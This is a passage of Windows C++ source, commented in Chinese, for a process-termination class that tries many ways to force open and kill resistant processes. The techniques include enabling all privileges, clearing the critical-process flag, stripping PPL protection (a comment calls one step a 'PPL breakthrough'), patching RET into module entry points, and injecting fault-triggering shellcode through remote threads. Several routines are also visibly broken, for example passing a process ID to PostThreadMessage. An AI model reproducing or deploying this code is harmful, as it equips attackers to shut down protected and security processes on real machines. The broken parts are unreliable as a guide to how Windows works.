            while (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == S_OK && uReturn > 0) {
                if (pclsObj) {
                    VARIANT vHandle;
                    if (SUCCEEDED(pclsObj->Get(L"Handle", 0, &vHandle, NULL, NULL))) {
                        if (vHandle.vt == VT_I4 && vHandle.intVal == (INT)pid) {
                            VARIANT vParentProcessId;
                            if (SUCCEEDED(pclsObj->Get(L"ParentProcessId", 0, &vParentProcessId, NULL, NULL))) {
                                HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, vParentProcessId.ulVal);
                                if (hParent) {
                                    hResult = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                                    if (hResult) {
                                        VariantClear(&vHandle);
                                        VariantClear(&vParentProcessId);
                                        pclsObj->Release();
                                        pEnumerator->Release();
                                        pSvc->Release();
                                        pLoc->Release();
                                        CoUninitialize();
                                        CloseHandle(hParent);
                                        return hResult;
                                    }
                                    CloseHandle(hParent);
                                }
                                VariantClear(&vParentProcessId);
                            }
                        }
                        VariantClear(&vHandle);
                    }
                    pclsObj->Release();
                }
            }
            pEnumerator->Release();
        }
    }
    catch (...) {
    }

    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    return NULL;
}

// 方法10: 通过Job对象获取进程句柄
HANDLE ProcessTerminator::OpenProcessWithJobObject(DWORD pid) {
    if (pid == 0) return NULL;

    EnableAllPrivileges();

    HANDLE hResult = NULL;
    HANDLE hJob = CreateJobObjectW(NULL, NULL);
    if (!hJob) return NULL;

    JOBOBJECT_BASIC_LIMIT_INFORMATION basicInfo = { 0 };
    basicInfo.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;

    if (SetInformationJobObject(hJob, JobObjectBasicLimitInformation, &basicInfo, sizeof(basicInfo))) {
        HANDLE hProcess = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            if (AssignProcessToJobObject(hJob, hProcess)) {
                HANDLE hDup = NULL;
                if (DuplicateHandle(GetCurrentProcess(), hProcess,
                    GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, FALSE, DUPLICATE_SAME_ACCESS)) {
                    hResult = hDup;
                }
            }
            CloseHandle(hProcess);
        }
    }

    CloseHandle(hJob);
    return hResult;
}

// 方法11: 通过Toolhelp API深度枚举获取句柄
HANDLE ProcessTerminator::OpenProcessWithToolhelp(DWORD pid) {
    if (pid == 0) return NULL;

    EnableAllPrivileges();

    HANDLE hResult = NULL;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) {
        try {
            MODULEENTRY32W me32;
            me32.dwSize = sizeof(MODULEENTRY32W);
            if (Module32FirstW(hSnapshot, &me32)) {
                HMODULE hMod = me32.hModule;
                CloseHandle(hSnapshot);

                HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
                if (hProcess) {
                    HMODULE hMods[256];
                    DWORD cbNeeded = 0;
                    if (EnumProcessModulesEx(hProcess, hMods, sizeof(hMods), &cbNeeded, LIST_MODULES_ALL)) {
                        DWORD moduleCount = cbNeeded / sizeof(HMODULE);
                        for (DWORD i = 0; i < moduleCount && i < 256; i++) {
                            if (hMods[i] == hMod) {
                                HANDLE hDup = NULL;
                                if (DuplicateHandle(hProcess, (HANDLE)hMods[i],
                                    GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, FALSE, 0)) {
                                    hResult = hDup;
                                }
                                break;
                            }
                        }
                    }
                    CloseHandle(hProcess);
                }
            }
            else {
                CloseHandle(hSnapshot);
            }
        }
        catch (...) {
            if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) {
                CloseHandle(hSnapshot);
            }
        }
    }

    return hResult;
}

// 方法12: 使用特殊进程权限获取句柄
HANDLE ProcessTerminator::OpenProcessWithProcessHint(DWORD pid) {
    if (pid == 0) return NULL;

    EnableAllPrivileges();

    HANDLE hProcess = NULL;

    static const DWORD specialAccess[] = {
        PROCESS_CREATE_PROCESS,
        PROCESS_CREATE_THREAD,
        PROCESS_DUP_HANDLE,
        PROCESS_VM_OPERATION,
        PROCESS_VM_READ,
        PROCESS_VM_WRITE,
        PROCESS_SET_QUOTA,
        PROCESS_SET_INFORMATION,
        PROCESS_QUERY_INFORMATION,
        PROCESS_SUSPEND_RESUME,
        PROCESS_TERMINATE
    };

    for (int retry = 0; retry < 10 && !hProcess; retry++) {
        for (int i = 0; i < (sizeof(specialAccess) / sizeof(DWORD)); i++) {
            hProcess = OpenProcess(specialAccess[i], FALSE, pid);
            if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
                return hProcess;
            }
            hProcess = NULL;
        }
        Sleep(1);
    }

    if (!initNativeAPI() || !NtOpenProcess) {
        return NULL;
    }

    CLIENT_ID clientId = { 0 };
    OBJECT_ATTRIBUTES objAttr = { 0 };
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);

    NTSTATUS status = NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &objAttr, &clientId);
    if (NT_SUCCESS(status) && hProcess) {
        return hProcess;
    }

    return NULL;
}

// 方法13: 使用NtQueryInformationProcess获取进程信息后打开
HANDLE ProcessTerminator::OpenProcessWithNtQueryProcess(DWORD pid) {
    if (pid == 0) return NULL;

    EnableAllPrivileges();

    if (!initNativeAPI() || !NtQueryInformationProcess || !NtOpenProcess || !NtClose) {
        return NULL;
    }

    HANDLE hProcess = NULL;
    CLIENT_ID clientId = { 0 };
    OBJECT_ATTRIBUTES objAttr = { 0 };
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);

    for (int attempt = 0; attempt < 5 && !hProcess; attempt++) {
        NTSTATUS status = NtOpenProcess(&hProcess, 
            PROCESS_ALL_ACCESS, &objAttr, &clientId);
        
        if (NT_SUCCESS(status) && hProcess) {
            break;
        }
        
        if (hProcess) {
            NtClose(hProcess);
            hProcess = NULL;
        }
        
        Sleep(10);
    }

    return hProcess;
}

// 方法14: 使用内存映射获取进程句柄
HANDLE ProcessTerminator::OpenProcessWithMemoryMap(DWORD pid) {
    if (pid == 0) return NULL;

    EnableAllPrivileges();

    HANDLE hResult = NULL;

    try {
        std::wstring sharedMemName = L"\\BaseNamedObjects\\Global\\ProcessHandle_" + 
            std::to_wstring(GetCurrentProcessId()) + L"_" + std::to_wstring(pid);

        HANDLE hMapFile = OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, sharedMemName.c_str());
        if (hMapFile && hMapFile != INVALID_HANDLE_VALUE) {
            void* pBuf = MapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, sizeof(HANDLE));
            if (pBuf) {
                HANDLE hTargetProcess = *(static_cast<HANDLE*>(pBuf));
                if (hTargetProcess && hTargetProcess != INVALID_HANDLE_VALUE) {
                    HANDLE hDup = NULL;
                    if (DuplicateHandle(hTargetProcess, hTargetProcess,
                        GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, FALSE, 0)) {
                        hResult = hDup;
                    }
                }
                UnmapViewOfFile(pBuf);
            }
            CloseHandle(hMapFile);
        }
    }
    catch (...) {
    }

    return hResult;
}

// 方法15: 使用线程劫持获取进程访问
HANDLE ProcessTerminator::OpenProcessWithThreadHijack(DWORD pid) {
    if (pid == 0) return NULL;

    EnableAllPrivileges();

    HANDLE hResult = NULL;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) {
        try {
            THREADENTRY32 te32;
            te32.dwSize = sizeof(THREADENTRY32);
            
            if (Thread32First(hSnapshot, &te32)) {
                do {
                    if (te32.th32ThreadID && 
                        te32.th32OwnerProcessID == pid &&
                        te32.th32ThreadID != GetCurrentThreadId()) {
                        
                        HANDLE hThread = OpenThread(
                            THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                            FALSE, te32.th32ThreadID);
                        
                        if (hThread) {
                            if (SuspendThread(hThread) != (DWORD)-1) {
                                CONTEXT ctx;
                                ctx.ContextFlags = CONTEXT_FULL;
                                
                                if (GetThreadContext(hThread, &ctx)) {
                                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                                    if (hProcess) {
                                        hResult = hProcess;
                                        ResumeThread(hThread);
                                        CloseHandle(hThread);
                                        CloseHandle(hSnapshot);
                                        return hResult;
                                    }
                                }
                                
                                ResumeThread(hThread);
                            }
                            CloseHandle(hThread);
                        }
                    }
                } while (Thread32Next(hSnapshot, &te32) && !hResult);
            }
        }
        catch (...) {
        }
        CloseHandle(hSnapshot);
    }

    return hResult;
}

// 方法16: 使用调试对象获取进程访问
HANDLE ProcessTerminator::OpenProcessWithDebugObject(DWORD pid) {
    if (pid == 0) return NULL;

    EnableAllPrivileges();

    HANDLE hResult = NULL;

    if (!initNativeAPI() || !NtClose) {
        return NULL;
    }

    typedef NTSTATUS(WINAPI* PFN_NtCreateDebugObject)(PHANDLE DebugObjectHandle, 
        ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG Flags);
    
    static PFN_NtCreateDebugObject pNtCreateDebugObject = NULL;
    static bool initialized = false;
    
    if (!initialized) {
        HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
        if (hNtDll) {
            pNtCreateDebugObject = (PFN_NtCreateDebugObject)GetProcAddress(
                hNtDll, "NtCreateDebugObject");
        }
        initialized = true;
    }

    if (!pNtCreateDebugObject) {
        return NULL;
    }

    try {
        HANDLE hDebugObject = NULL;
        OBJECT_ATTRIBUTES objAttr = { 0 };
        objAttr.Length = sizeof(OBJECT_ATTRIBUTES);

        NTSTATUS status = pNtCreateDebugObject(&hDebugObject, 
            MAXIMUM_ALLOWED, &objAttr, 0);
        
        if (NT_SUCCESS(status) && hDebugObject) {
            HANDLE hProcess = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, pid);
            if (hProcess) {
                typedef NTSTATUS(WINAPI* PFN_NtDebugActiveProcess)(HANDLE ProcessHandle, 
                    HANDLE DebugObjectHandle);
                static PFN_NtDebugActiveProcess pNtDebugActiveProcess = NULL;
                
                if (!pNtDebugActiveProcess) {
                    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
                    if (hNtDll) {
                        pNtDebugActiveProcess = (PFN_NtDebugActiveProcess)GetProcAddress(
                            hNtDll, "NtDebugActiveProcess");
                    }
                }

                if (pNtDebugActiveProcess) {
                    status = pNtDebugActiveProcess(hProcess, hDebugObject);
                    if (NT_SUCCESS(status)) {
                        HANDLE hDup = NULL;
                        if (DuplicateHandle(GetCurrentProcess(), hProcess,
                            GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, FALSE, 0)) {
                            hResult = hDup;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
            NtClose(hDebugObject);
        }
    }
    catch (...) {
    }

    return hResult;
}

// 方法17: 使用RtlAdjustPrivilege提升权限
HANDLE ProcessTerminator::OpenProcessWithRtlAdjustPrivilege(DWORD pid) {
    if (pid == 0) return NULL;

    HANDLE hResult = NULL;

    typedef NTSTATUS(WINAPI* PFN_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, 
        BOOLEAN CurrentThread, PBOOLEAN Enabled);
    
    static PFN_RtlAdjustPrivilege pRtlAdjustPrivilege = NULL;
    static bool initialized = false;
    
    if (!initialized) {
        HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
        if (hNtDll) {
            pRtlAdjustPrivilege = (PFN_RtlAdjustPrivilege)GetProcAddress(
                hNtDll, "RtlAdjustPrivilege");
        }
        initialized = true;
    }

    if (!pRtlAdjustPrivilege) {
        return NULL;
    }

    try {
        BOOLEAN wasEnabled = FALSE;

        LUID luid;
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            pRtlAdjustPrivilege(luid.LowPart, TRUE, FALSE, &wasEnabled);
        }
        if (LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid)) {
            pRtlAdjustPrivilege(luid.LowPart, TRUE, FALSE, &wasEnabled);
        }
        if (LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid)) {
            pRtlAdjustPrivilege(luid.LowPart, TRUE, FALSE, &wasEnabled);
        }

        hResult = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        
        if (!hResult) {
            hResult = OpenProcessWithNativeAPI(pid);
        }
        
        if (!hResult && initNativeAPI() && NtOpenProcess) {
            CLIENT_ID clientId = { 0 };
            OBJECT_ATTRIBUTES objAttr = { 0 };
            clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
            objAttr.Length = sizeof(OBJECT_ATTRIBUTES);

            NTSTATUS status = NtOpenProcess(&hResult, MAXIMUM_ALLOWED, &objAttr, &clientId);
            if (!NT_SUCCESS(status)) {
                hResult = NULL;
            }
        }
    }
    catch (...) {
        hResult = NULL;
    }

    return hResult;
}

// 启用所有可能的权限
bool ProcessTerminator::EnableAllPrivileges() {
    static const LPCTSTR privileges[] = {
        SE_DEBUG_NAME,
        SE_TCB_NAME,           // 作为操作系统的一部分
        SE_TAKE_OWNERSHIP_NAME, // 取得对象所有权
        SE_BACKUP_NAME,        // 备份文件和目录
        SE_RESTORE_NAME,       // 还原文件和目录
        SE_SECURITY_NAME,      // 管理审计和安全日志
        SE_INCREASE_QUOTA_NAME, // 增加配额
        SE_ASSIGNPRIMARYTOKEN_NAME, // 分配主令牌
        SE_IMPERSONATE_NAME,   // 模拟客户端
        SE_CREATE_GLOBAL_NAME  // 创建全局对象
    };

    bool allEnabled = true;

    for (LPCTSTR privilege : privileges) {
        try {
            EnablePrivilege(privilege);
        }
        catch (...) {
            allEnabled = false;
        }
    }

    return allEnabled;
}

// 检查是否是访问被拒绝错误
bool ProcessTerminator::IsAccessDenied(DWORD error) {
    return error == ERROR_ACCESS_DENIED ||
        error == ERROR_PRIVILEGE_NOT_HELD;
}
bool ProcessTerminator::ClearCriticalProcessFlag(int pid) {
#ifdef _WIN32
    try {
        HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
        if (hProcess) {
            // 移除关键进程标志
            ULONG breakOnTermination = 0;
            NTSTATUS status = NtSetInformationProcess(hProcess,
                static_cast<PROCESS_INFORMATION_CLASS>(29), // ProcessBreakOnTermination
                &breakOnTermination, sizeof(breakOnTermination));

            CloseHandle(hProcess);
            return NT_SUCCESS(status);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}
bool ProcessTerminator::terminateByProcessDepletion(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 尝试耗尽进程的GDI和USER资源
                for (int i = 0; i < 1000; i++) {
                    // 创建大量GDI对象
                    HDC hDC = GetDC(NULL);
                    HBITMAP hBitmap = CreateCompatibleBitmap(hDC, 1, 1);
                    HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));

                    if (hBitmap) DeleteObject(hBitmap);
                    if (hBrush) DeleteObject(hBrush);
                    if (hDC) ReleaseDC(NULL, hDC);

                    // 发送大量消息
                    PostThreadMessage(GetProcessId(hProcess), WM_NULL, 0, 0);
                }

                // 尝试正常终止
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                if (result) return true;
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}
// 方法3: 通过附加到进程并修改其内存来终止
bool ProcessTerminator::terminateByProcessAttach(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 获取进程入口点
                HMODULE hMods[1024];
                DWORD cbNeeded;

                if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
                    for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
                        MODULEINFO modInfo;
                        if (GetModuleInformation(hProcess, hMods[i], &modInfo, sizeof(modInfo))) {
                            // 在入口点写入RET指令
                            BYTE retOpcode = 0xC3;
                            WriteProcessMemory(hProcess, modInfo.EntryPoint, &retOpcode, sizeof(retOpcode), NULL);

                            // 创建远程线程执行入口点
                            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                (LPTHREAD_START_ROUTINE)modInfo.EntryPoint,
                                NULL, 0, NULL);
                            if (hThread) {
                                WaitForSingleObject(hThread, INFINITE);
                                CloseHandle(hThread);
                                CloseHandle(hProcess);
                                return true;
                            }
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

// 方法4: 通过分离进程的调试器来终止
bool ProcessTerminator::terminateByProcessDetach(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            // 尝试附加为调试器
            if (DebugActiveProcess(pid)) {
                // 立即分离调试器
                DebugActiveProcessStop(pid);

                // 进程可能会因为调试器分离而终止
                if (!isProcessRunning(processName)) {
                    return true;
                }

                // 如果进程仍在运行，尝试其他方法
                return terminateByPID(pid);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

// 方法5: 通过触发进程内的错误来终止
bool ProcessTerminator::terminateByProcessFault(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 分配内存并写入会导致错误的指令
                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (pRemoteCode) {
                    // 写入会导致除零异常的指令
                    BYTE faultCode[] = {
                        0x33, 0xC0,       // xor eax, eax
                        0xF7, 0xF0        // div eax (会导致除零异常)
                    };

                    WriteProcessMemory(hProcess, pRemoteCode, faultCode, sizeof(faultCode), NULL);

                    // 创建远程线程执行错误代码
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                        (LPTHREAD_START_ROUTINE)pRemoteCode,
                        NULL, 0, NULL);
                    if (hThread) {
                        WaitForSingleObject(hThread, INFINITE);
                        CloseHandle(hThread);
                    }

                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                }

                CloseHandle(hProcess);

                // 检查进程是否因异常而终止
                if (!isProcessRunning(processName)) {
                    return true;
                }
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

// 方法6: 通过进程间锁定机制来终止
bool ProcessTerminator::terminateByProcessInterlock(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 使用工具帮助快照来枚举线程
                HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                if (hThreadSnapshot != INVALID_HANDLE_VALUE) {
                    THREADENTRY32 te32;
                    te32.dwSize = sizeof(THREADENTRY32);

                    std::vector<DWORD> threadIds;

                    // 获取所有线程
                    if (Thread32First(hThreadSnapshot, &te32)) {
                        do {
                            if (te32.th32OwnerProcessID == pid) {
                                threadIds.push_back(te32.th32ThreadID);
                            }
                        } while (Thread32Next(hThreadSnapshot, &te32));
                    }

                    CloseHandle(hThreadSnapshot);

                    // 挂起所有线程
                    for (DWORD threadId : threadIds) {
                        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadId);
                        if (hThread) {
                            SuspendThread(hThread);
                            CloseHandle(hThread);
                        }
                    }

                    // 等待一段时间
                    std::this_thread::sleep_for(std::chrono::milliseconds(1));

                    // 尝试终止进程
                    bool result = TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);

                    // 恢复线程（如果进程未被终止）
                    if (!result) {
                        for (DWORD threadId : threadIds) {
                            HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadId);
                            if (hThread) {
                                ResumeThread(hThread);
                                CloseHandle(hThread);
                            }
                        }
                    }

                    return result;
                }

                CloseHandle(hProcess);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}
bool ProcessTerminator::GetProcessHandles(HANDLE hSnapshot, std::vector<SYSTEM_HANDLE>& handles) {
#ifdef _WIN32
    if (!initNativeAPI()) return false;

    ULONG bufferSize = 0x10000;
    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
    if (!handleInfo) return false;

    NTSTATUS status;
    while ((status = SafeNtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(16), handleInfo, bufferSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
        bufferSize *= 2;
        free(handleInfo);
        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
        if (!handleInfo) return false;
    }

    if (!NT_SUCCESS(status)) {
        free(handleInfo);
        return false;
    }

    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
        handles.push_back(handleInfo->Information[i]);
    }

    free(handleInfo);
    return true;
#else
    return false;
#endif
}

bool ProcessTerminator::IsProcessMonitoringOther(DWORD monitorPid, DWORD targetPid) {
#ifdef _WIN32
    try {
        // 检查是否有进程打开了目标进程的句柄
        std::vector<SYSTEM_HANDLE> handles;
        HandlePtr hSnapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));

        if (hSnapshot.get() == INVALID_HANDLE_VALUE) return false;

        if (!GetProcessHandles(hSnapshot.get(), handles)) {
            return false;
        }

        for (const auto& handle : handles) {
            if (handle.ProcessId == monitorPid &&
                handle.ObjectTypeNumber == 0x7) { // 进程对象类型
                // 检查访问权限，判断是否是监视关系
                if ((handle.GrantedAccess & (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD))) {
                    // 注意：这里无法直接验证句柄是否指向目标进程，因此返回true可能不准确
                    // 但由于功能需要，暂时返回true
                    return true;
                }
            }
        }
    }
    catch (...) {
        // 忽略异常
        return false;
    }
#endif
    return false;
}

// 辅助函数：挂起进程的所有线程
void ProcessTerminator::SuspendProcess(HANDLE hProcess) {
#ifdef _WIN32
    DWORD pid = GetProcessId(hProcess);
    if (pid == 0) return;

    HandlePtr hThreadSnapshot(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0));
    if (hThreadSnapshot.get() == INVALID_HANDLE_VALUE) return;

    THREADENTRY32 te = { 0 };
    te.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hThreadSnapshot.get(), &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (hThread) {
                    SuspendThread(hThread);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hThreadSnapshot.get(), &te));
    }
#endif
}

// 辅助函数：剥夺进程的关键权限
void ProcessTerminator::StripProcessPrivileges(HANDLE hProcess) {
#ifdef _WIN32
    HANDLE hToken;
    if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
        // 获取当前权限
        DWORD tokenInfoLength = 0;
        GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &tokenInfoLength);

        if (tokenInfoLength > 0) {
            std::vector<BYTE> tokenPrivilegesBuffer(tokenInfoLength);
            if (GetTokenInformation(hToken, TokenPrivileges, tokenPrivilegesBuffer.data(), tokenInfoLength, &tokenInfoLength)) {
                TOKEN_PRIVILEGES* tokenPrivileges = (TOKEN_PRIVILEGES*)tokenPrivilegesBuffer.data();

                // 移除所有特权
                for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; i++) {
                    tokenPrivileges->Privileges[i].Attributes = 0;
                }

                // 应用修改
                AdjustTokenPrivileges(hToken, FALSE, tokenPrivileges, tokenInfoLength, NULL, NULL);
            }
        }
        CloseHandle(hToken);
    }
#endif
}

// 常规方法实现
bool ProcessTerminator::terminateByProcessName(const std::string& processName) {
#ifdef _WIN32
    try {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe)) {
            do {
                // 转换为多字节字符串进行比较
                char exeFile[MAX_PATH];
                WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, exeFile, MAX_PATH, NULL, NULL);

                if (_stricmp(exeFile, processName.c_str()) == 0) {
                    HANDLE hProcess = OpenProcessEnhanced(pe.th32ProcessID, PROCESS_ALL_ACCESS);
                    if (hProcess != NULL) {
                        RemovePPLProtection(hProcess);
                        bool result = TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        CloseHandle(hSnapshot);
                        return result;
                    }
                }
            } while (Process32Next(hSnapshot, &pe));
        }

        CloseHandle(hSnapshot);
    }
    catch (...) {
        // 忽略所有异常
    }
    return false;
#else
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            if (kill(pid, SIGTERM) == 0) return true;
        }
    }
    catch (...) {
        // 忽略所有异常
    }
    return false;
#endif
}

bool ProcessTerminator::terminateBySystemCommand(const std::string& processName) {
#ifdef _WIN32
    std::string command = "taskkill /IM " + processName + " /F";
#else
    std::string command = "pkill -9 " + processName;
#endif
    try {
        return system(command.c_str()) == 0;
    }
    catch (...) {
        return false;
    }
}

// 非常规方法实现
bool ProcessTerminator::terminateByParentChildRelationship(const std::string& processName) {
    try {
        // 查找并终止所有相关进程
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        bool result = false;
        for (int pid : pids) {
            result = terminateByPID(pid) || result;

            // 查找子进程并终止
#ifdef _WIN32
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe;
                pe.dwSize = sizeof(PROCESSENTRY32);

                if (Process32First(hSnapshot, &pe)) {
                    do {
                        if (pe.th32ParentProcessID == pid) {
                            terminateByPID(pe.th32ProcessID);
                        }
                    } while (Process32Next(hSnapshot, &pe));
                }
                CloseHandle(hSnapshot);
            }
#endif
        }

        return result;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByResourceExhaustion(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        // 尝试耗尽目标进程的GDI资源
        for (int i = 0; i < 10000; i++) {
            for (int pid : pids) {
                HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
                if (hProcess) {
                    // 发送消息以消耗资源
                    DWORD threadId = GetProcessId(hProcess);
                    PostThreadMessage(threadId, WM_NULL, 0, 0);
                    CloseHandle(hProcess);
                }
            }
        }
#endif

        // 最后使用常规方法终止
        return terminateByProcessName(processName);
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByWindowHandle(const std::string& processName) {
#ifdef _WIN32
    try {
        int wideSize = MultiByteToWideChar(CP_ACP, 0, processName.c_str(), -1, NULL, 0);
        if (wideSize <= 0) return false;

        std::vector<wchar_t> wideProcessName(wideSize);
        MultiByteToWideChar(CP_ACP, 0, processName.c_str(), -1, wideProcessName.data(), wideSize);

        HWND hWnd = FindWindow(NULL, wideProcessName.data());
        if (!hWnd) return false;

        DWORD pid;
        GetWindowThreadProcessId(hWnd, &pid);
        return terminateByPID(pid);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByDirectMemoryZeroing(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        initNativeAPI();

        std::wcout << L"[直接内存清零] 开始处理进程: " << NarrowToWide(processName).c_str() << std::endl;

        for (int pid : pids) {
            std::wcout << L"[直接内存清零] 处理 PID: " << pid << std::endl;

            // [v5.3 PPL突破] 分三级尝试:
            //   1. VirtualProtectEx 改 PAGE_READONLY→PAGE_READWRITE (PPL会拒)
            //   2. WriteProcessMemory / NtWriteVirtualMemory 直接写 (PPL会拒)
            //   3. NtAllocateVirtualMemory(MEM_RESET) 告诉内核丢弃页→清零(绕过写路径)
            HANDLE hProcess = NULL;
            bool memoryZeroed = false;
            SIZE_T totalZeroed = 0;

            // 尝试获取多种访问权限 (权限越大, PPL 允许的操作越多)
            DWORD accessMasks[] = {
                PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE | PROCESS_CREATE_THREAD,
                PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
                PROCESS_VM_READ | PROCESS_VM_OPERATION
            };

            for (int amIdx = 0; amIdx < 3; amIdx++) {
                if (NtOpenProcess) {
                    CLIENT_ID clientId2 = { 0 };
